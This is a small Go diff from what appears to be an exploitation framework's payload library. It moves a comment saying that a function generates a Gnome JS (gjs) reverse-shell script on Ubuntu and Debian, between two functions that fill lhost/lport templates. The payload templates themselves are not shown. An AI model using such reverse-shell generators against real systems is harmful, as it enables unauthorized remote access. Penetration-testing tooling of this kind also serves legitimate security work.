+++ payload/reverse/gjscript.go
@@ -23,12 +23,13 @@ try {
 }`
 )
 
-// Generates a script that can be used to create a reverse shell via
-// gjs (Gnome JS - present on Ubuntu, Debian by default).
+// Generates Gnome JS payload.
 func (gjs *GJScriptPayload) Default(lhost string, lport int) string {
 	return fmt.Sprintf(GJScriptDefault, lhost, lport)
 }
 
+// Generates a script that can be used to create a reverse shell via
+// gjs (Gnome JS - present on Ubuntu, Debian by default).
 func (gjs *GJScriptPayload) GLibSpawn(lhost string, lport int) string {
 	return fmt.Sprintf(GJScriptGLibSpawn, lhost, lport)
 }
